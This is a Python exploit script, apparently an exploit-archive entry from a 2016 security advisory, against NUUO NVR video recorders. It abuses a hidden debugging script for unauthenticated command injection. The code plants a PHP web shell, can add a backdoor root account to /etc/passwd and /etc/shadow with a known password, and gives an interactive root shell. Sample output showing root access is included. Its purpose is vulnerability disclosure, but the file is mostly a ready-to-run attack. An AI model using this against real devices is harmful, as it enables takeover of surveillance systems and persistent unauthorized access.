#
#
# NUUO Remote Root Exploit
#
#
# Vendor: NUUO Inc.
# Product web page: http://www.nuuo.com
# Affected version: <=3.0.8
#
# Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
# functionality. Setup is simple and easy, with automatic port forwarding
# settings built in. NVRmini 2 supports POS integration, making this the perfect
# solution for small retail chain stores. NVRmini 2 also comes full equipped as
# a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
# and RAID functions for data protection. Choose NVR and know that your valuable video
# data is safe, always.
#
# Desc: NUUO NVRmini, NVRmini2, Crystal and NVRSolo suffers from an unauthenticated command
# injection vulnerability. Due to an undocumented and hidden debugging script, an attacker
# can inject and execute arbitrary code as the root user via the &#039;log&#039; GET parameter in the 
# &#039;__debugging_center_utils___.php&#039; script.
#
# -----------------------------------------------------
# $ nuuo.py 10.0.0.17 80
# [*] ==============================================
# [*] NUUO NVR/DVR/NDVR Remote Root Exploit
# [*] Zero Science Lab - http://www.zeroscience.mk
# [*] ==============================================
# [*] Backdoor detected!
# [*] Add root user (y/n)? n
# [*] Press [ ENTER ] to start root shell...
#
# root@nuuo:~# id
# uid=0(root) gid=0(root)
#
# root@nuuo:~# exit
#
# [*] Removing raidh.php file
# [*] Session terminated!
#
# $
# -----------------------------------------------------
#
# Tested on: GNU/Linux 3.0.8 (armv7l)
#            GNU/Linux 2.6.31.8 (armv5tel)
#            lighttpd/1.4.28
#            PHP/5.5.3
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
# Zero Science Lab - http://www.zeroscience.mk
#
#
# Advisory ID: ZSL-2016-5348
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5348.php
# NSE Script: http://www.zeroscience.mk/codes/nuuo-backdoor.nse
# https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40209.zip
#
#
# 14.01.2016
#
 
import os######
import sys#####
import time####
import urllib##
import binascii
import requests
  
__author__ = &#039;lqwrm&#039;
 
def persist(host,port,hexy,clean):
 
    pwd = &#039;&#039;&#039;echo &#039;roOt:x:0:0:PWNED account:/:/bin/bash&#039; >> /etc/passwd&#039;&#039;&#039;
    sdw = &#039;&#039;&#039;echo &#039;roOt:$1$MJOnV/Y3$tDnMIBMy0lEQ2kDpfgTJP0:16914:0:99999:7:::&#039; >> /etc/shadow&#039;&#039;&#039;
    print &#039;[*] Adding user \&#039;roOt\&#039; with password \&#039;rewt\&#039; in passwd file.&#039;
    requests.get(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/raidh.php?cmd=&#039;+pwd)
    time.sleep(2)
     
    print &#039;[*] Updating shadow file.&#039;
    requests.get(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/raidh.php?cmd=&#039;+sdw)
    time.sleep(2)
     
    print &#039;[*] Shell awaits: ssh roOt@&#039;+host
    requests.get(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/raidh.php?cmd=&#039;+urllib.quote(clean))
    exit(0)
 
def check(host,port,hexy):
 
    try:
        r = requests.get(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+hexy, allow_redirects=False)
        if r.status_code == 200:
            print &#039;[*] Backdoor detected!&#039;
            pass
        else:
            print &#039;[*] No backdoors here. :(&#039;
            exit(0)
    except Exception:
        print &#039;[*] Could not connect.&#039;
        exit(0)
 
def main():
 
    print &#039;[*] ==============================================&#039;
    print &#039;[*] NUUO NVR/DVR/NDVR Remote Root Exploit&#039;
    print &#039;[*] Zero Science Lab - http://www.zeroscience.mk&#039;
    print &#039;[*] ==============================================&#039;
 
    if (len(sys.argv) <= 2):
        print &#039;[*] Usage: nuuo.py <ipaddress> <port>&#039;
        exit(0)
 
    host = sys.argv[1]
    port = sys.argv[2]
 
    dbgcu = &#039;5f5f64&#039;#
    dbgcu+= &#039;656275&#039;#
    dbgcu+= &#039;676769&#039;#
    dbgcu+= &#039;6e675f&#039;#
    dbgcu+= &#039;63656e&#039;#
    dbgcu+= &#039;746572&#039;#
    dbgcu+= &#039;5f7574&#039;#
    dbgcu+= &#039;696c73&#039;#
    dbgcu+= &#039;5f5f5f&#039;#
    dbgcu+= &#039;2e7068&#039;#
    dbgcu+= &#039;70&#039;###&#039;#
 
    hexy = binascii.unhexlify(dbgcu)
    check (host,port,hexy)
 
    payload = &#039;&#039;&#039;echo "<?php system(\$_REQUEST[\&#039;cmd\&#039;]); ?>" > raidh.php&#039;&#039;&#039;
    requests.get(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+hexy+&#039;?log=1337;&#039; + payload)
 
    clean = &#039;rm raidh.php&#039;
    a1 = raw_input(&#039;[*] Add root user (y/n)? &#039;)
    if a1.strip() == &#039;y&#039; or a1.strip() == &#039;Y&#039;:
        persist (host,port,hexy,clean)
    else:
        pass
 
    print &#039;[*] Press [ ENTER ] to start root shell...&#039;
    raw_input()
 
    while True:
        try:
            cmd = raw_input(&#039;root@nuuo:~# &#039;)
            if cmd.strip() == &#039;&#039;:
                print &#039;[*] Give me a command!\n&#039;
                continue
            else:
                e = requests.get(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/raidh.php?cmd=&#039;+urllib.quote(cmd))
                print e.text
            if cmd.strip() == &#039;exit&#039;:
                print &#039;[*] Removing raidh.php file&#039;
                requests.get(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/raidh.php?cmd=&#039;+urllib.quote(clean))
                print &#039;[*] Session terminated!&#039;
                break
        except Exception:
            break
 
if __name__ == "__main__":
    main()

